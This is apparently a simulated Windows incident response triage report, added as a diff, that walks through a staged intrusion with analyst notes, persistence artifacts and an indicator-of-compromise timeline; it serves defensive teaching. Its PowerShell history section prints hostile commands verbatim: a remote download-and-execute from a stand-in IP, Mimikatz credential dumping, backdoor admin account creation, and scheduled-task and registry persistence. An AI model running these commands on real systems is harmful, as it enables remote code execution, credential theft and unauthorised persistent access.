@@ -1,0 +1,219 @@
+================================================================
+  WINDOWS INCIDENT RESPONSE TRIAGE REPORT
+  Host     : VICTIM-PC
+  Timestamp: 2025-03-15 02:47:33
+  User     : VICTIM-PC\Administrator
+  OS       : Windows 10 Pro 10.0.19045
+================================================================
+
+[*] Running as Administrator: True
+
+================================================================
+  SECTION: SYSTEM INFORMATION
+  Collected: 2025-03-15 02:47:33
+================================================================
+[+] Hostname    : VICTIM-PC
+[+] OS          : Windows 10 Pro 10.0.19045
+[+] Architecture: AMD64
+[+] Admin rights: True
+
+[+] Full system info (systeminfo):
+----------------------------------------------------------------
+Host Name:                 VICTIM-PC
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19045 N/A Build 19045
+OS Manufacturer:           Microsoft Corporation
+System Type:               x64-based PC
+Total Physical Memory:     16,384 MB
+Domain:                    CORP.LOCAL
+Logon Server:              \\DC01
+
+================================================================
+  SECTION: RUNNING PROCESSES
+  Collected: 2025-03-15 02:47:35
+================================================================
+[+] Processes with paths (PowerShell Get-Process):
+
+Name                Id    CPU(s)  WS(MB)  Path
+----                --    ------  ------  ----
+powershell         4892   12.34    87.2   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+cmd                3344    0.44    12.1   C:\Windows\System32\cmd.exe
+# ⚠ SUSPICIOUS: svchost32 is NOT a legitimate Windows process name
+svchost32          9182    8.21    45.6   C:\Users\Public\svchost32.exe
+chrome             2211    4.12   312.0   C:\Program Files\Google\Chrome\Application\chrome.exe
+explorer           1820    0.88    98.4   C:\Windows\explorer.exe
+lsass              820     0.21    16.2   C:\Windows\System32\lsass.exe
+services           704     0.08     8.4   C:\Windows\System32\services.exe
+svchost            980     0.44    28.1   C:\Windows\System32\svchost.exe
+
+# ⚠ ANALYST NOTE: svchost32.exe running from C:\Users\Public\ is a major red flag.
+#   Legitimate svchost.exe lives in C:\Windows\System32\ and is never named "svchost32".
+
+================================================================
+  SECTION: NETWORK CONNECTIONS
+  Collected: 2025-03-15 02:47:38
+================================================================
+[+] Active connections with PIDs (netstat -ano):
+
+Proto  Local Address          Foreign Address        State        PID
+TCP    0.0.0.0:135            0.0.0.0:*              LISTENING    956
+TCP    0.0.0.0:445            0.0.0.0:*              LISTENING    4
+TCP    192.168.1.50:49832     198.51.100.43:4444     ESTABLISHED  9182
+TCP    192.168.1.50:49833     104.21.8.174:443       ESTABLISHED  2211
+TCP    0.0.0.0:3389           0.0.0.0:*              LISTENING    1116
+TCP    0.0.0.0:5985           0.0.0.0:*              LISTENING    4
+
+# ⚠ ANALYST NOTE:
+#   PID 9182 (svchost32.exe) has an ESTABLISHED connection to 198.51.100.43:4444
+#   Port 4444 is Metasploit's default listener port — strong C2 indicator.
+#   RDP (3389) and WinRM (5985) are both open — check if expected.
+
+================================================================
+  SECTION: PREFETCH FILES
+  Collected: 2025-03-15 02:47:40
+================================================================
+[+] 47 prefetch files found (sorted by last run time):
+
+Filename                                    KB     Last Modified           First Seen
+--------                                    --     -------------           ----------
+SVCHOST32.EXE-A4F3C219.pf                  82.4   2025-03-15 02:31:18     2025-03-15 02:31:18
+POWERSHELL.EXE-B97F3E00.pf                114.2   2025-03-15 02:31:05     2025-02-10 14:22:11
+CMD.EXE-9D7F3A12.pf                        44.1   2025-03-15 02:30:58     2021-08-14 09:00:00
+NET.EXE-B4F2A811.pf                        31.2   2025-03-15 02:30:45     2021-08-14 09:00:00
+WHOAMI.EXE-3F7A9B22.pf                     18.4   2025-03-15 02:30:40     2025-03-15 02:30:40
+IPCONFIG.EXE-C2F71E33.pf                   22.1   2025-03-15 02:30:37     2025-03-15 02:30:37
+NETSTAT.EXE-11F43A22.pf                    19.8   2025-03-15 02:30:35     2025-03-15 02:30:35
+MIMIKATZ.EXE-F83A2C41.pf                   67.3   2025-03-15 02:28:14     2025-03-15 02:28:14
+CHROME.EXE-C4A211FF.pf                    241.0   2025-03-14 23:11:02     2021-09-01 10:00:00
+EXPLORER.EXE-775D4199.pf                   88.2   2025-03-14 22:45:11     2021-08-14 09:00:00
+
+# ⚠ ANALYST NOTES:
+#   - MIMIKATZ.EXE appeared for the FIRST TIME at 02:28:14 — classic credential dumping tool
+#   - SVCHOST32.EXE — newly appeared, never seen before (First Seen = Last Modified)
+#   - WHOAMI, NET, IPCONFIG, NETSTAT all run in rapid succession = attacker recon pattern
+#   - Prefetch timestamps give you a precise execution timeline even if the binary is deleted
+
+================================================================
+  SECTION: WINDOWS EVENT LOGS
+  Collected: 2025-03-15 02:47:45
+================================================================
+[+] Failed Logons (4625):
+----------------------------------------------------------------
+2025-03-15 02:14:32 | ID:4625 | An account failed to log on. Account Name: Administrator Failure Reason: %%2313 Logon Type: 3 Network Info: Workstation: ATTACKER-PC Source Network: 10.0.0.99
+2025-03-15 02:14:33 | ID:4625 | An account failed to log on. Account Name: Administrator Failure Reason: %%2313 Logon Type: 3 Network Info: Source Network: 10.0.0.99
+2025-03-15 02:14:34 | ID:4625 | An account failed to log on. Account Name: Administrator Failure Reason: %%2313 Logon Type: 3 Network Info: Source Network: 10.0.0.99
+[... 47 more failures from 10.0.0.99 between 02:14 and 02:17 ...]
+2025-03-15 02:17:55 | ID:4624 | An account was successfully logged on. Account Name: Administrator Logon Type: 3 Network: 10.0.0.99
+
+# ⚠ ANALYST NOTE: 50 failed logins followed by a success = brute force attack succeeded.
+#   Logon Type 3 = network logon (SMB/RDP). Source: 10.0.0.99 (attacker IP).
+
+[+] Account Created (4720):
+2025-03-15 02:29:01 | ID:4720 | A user account was created. New Account: bkpadmin Attributes: SamAccountName=bkpadmin
+
+# ⚠ Backdoor account created at 02:29 — attacker establishing persistence.
+
+[+] Process Creation (4688):
+2025-03-15 02:28:10 | ID:4688 | Process: C:\Users\Public\mimikatz.exe Creator: powershell.exe
+2025-03-15 02:31:18 | ID:4688 | Process: C:\Users\Public\svchost32.exe Creator: cmd.exe
+2025-03-15 02:31:25 | ID:4688 | Process: net.exe Args: "net user bkpadmin Password123! /add"
+2025-03-15 02:31:28 | ID:4688 | Process: net.exe Args: "net localgroup administrators bkpadmin /add"
+
+================================================================
+  SECTION: SCHEDULED TASKS
+  Collected: 2025-03-15 02:47:52
+================================================================
+[+] Enabled scheduled tasks:
+
+TaskName                        TaskPath    State    LastRun                  Actions
+--------                        --------    -----    -------                  -------
+IR_Simulation_PersistenceTask   \           Ready    2025-03-15 02:31:45      cmd.exe /c ...
+MicrosoftEdgeUpdateTaskMachine  \Microsoft  Ready    2025-03-15 01:00:00      MicrosoftEdgeUpdate.exe /c
+WindowsDefenderCache            \           Ready    2025-03-15 02:31:50      C:\Users\Public\svchost32.exe
+
+# ⚠ ANALYST NOTES:
+#   - "WindowsDefenderCache" is NOT a real Windows task name — attacker masquerading as defender
+#   - It runs svchost32.exe from Public folder — persistence mechanism confirmed
+#   - Creation time 02:31 matches the attack timeline above
+
+================================================================
+  SECTION: STARTUP ITEMS & PERSISTENCE
+  Collected: 2025-03-15 02:47:55
+================================================================
+[+] Registry Run keys — HKLM:
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
+    WindowsUpdate     REG_SZ           C:\Users\Public\svchost32.exe
+
+# ⚠ "WindowsUpdate" Run key pointing to C:\Users\Public\svchost32.exe — persistence via registry.
+#   Legitimate Windows Update never runs from Users\Public.
+
+================================================================
+  SECTION: USER ACCOUNTS
+  Collected: 2025-03-15 02:47:58
+================================================================
+[+] Local user accounts:
+Name            Enabled  LastLogon               PasswordLastSet
+----            -------  ---------               ---------------
+Administrator   True     2025-03-15 02:17:55     2024-01-10 09:00:00
+bkpadmin        True     2025-03-15 02:29:05     2025-03-15 02:29:01
+Guest           False    Never
+john.smith      True     2025-03-14 18:30:22     2025-01-05 08:00:00
+
+# ⚠ bkpadmin account created 2025-03-15 02:29:01 — during the attack window. Backdoor account.
+
+================================================================
+  SECTION: POWERSHELL COMMAND HISTORY
+  Collected: 2025-03-15 02:48:01
+================================================================
+[+] History file: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+----------------------------------------------------------------
+whoami /all
+net user
+net localgroup administrators
+Get-LocalUser | Where-Object {$_.Enabled -eq $true}
+Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
+netstat -ano | findstr ESTABLISHED
+Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'}
+Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.43/stage2.ps1')
+Invoke-Mimikatz -DumpCreds
+net user bkpadmin Password123! /add
+net localgroup administrators bkpadmin /add
+schtasks /create /tn "WindowsDefenderCache" /tr "C:\Users\Public\svchost32.exe" /sc ONLOGON /ru SYSTEM /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\svchost32.exe" /f
+
+# ⚠ ANALYST NOTE: Full attack chain visible in PS history:
+#   1. Recon (whoami, net user, netstat)
+#   2. Download (IEX/DownloadString from C2 IP)
+#   3. Credential dumping (Invoke-Mimikatz)
+#   4. Persistence (scheduled task + registry Run key)
+#   5. Backdoor user creation (net user bkpadmin)
+
+================================================================
+  SUMMARY OF INDICATORS OF COMPROMISE (IOCs)
+================================================================
+
+  HOST INDICATORS:
+    [!] C:\Users\Public\svchost32.exe      — masqueraded binary / implant
+    [!] C:\Users\Public\mimikatz.exe       — credential dumping tool
+    [!] Scheduled task: WindowsDefenderCache — malicious persistence
+    [!] Registry Run: WindowsUpdate key    — malicious persistence
+    [!] Local user: bkpadmin               — backdoor account
+
+  NETWORK INDICATORS:
+    [!] 198.51.100.43:4444                 — C2 callback (port 4444 / Metasploit)
+    [!] 10.0.0.99                          — attacker pivot IP (brute force source)
+
+  TIMELINE:
+    02:14 – Brute force attack begins (50 failures from 10.0.0.99)
+    02:17 – Brute force succeeds; attacker gains network logon
+    02:28 – Mimikatz executed; credentials dumped
+    02:29 – Backdoor account "bkpadmin" created
+    02:31 – Implant svchost32.exe deployed; persistence established
+    02:31 – C2 connection to 198.51.100.43:4444 established
+
+================================================================
+  END OF WINDOWS TRIAGE REPORT
+  Completed: 2025-03-15 02:48:05
+================================================================
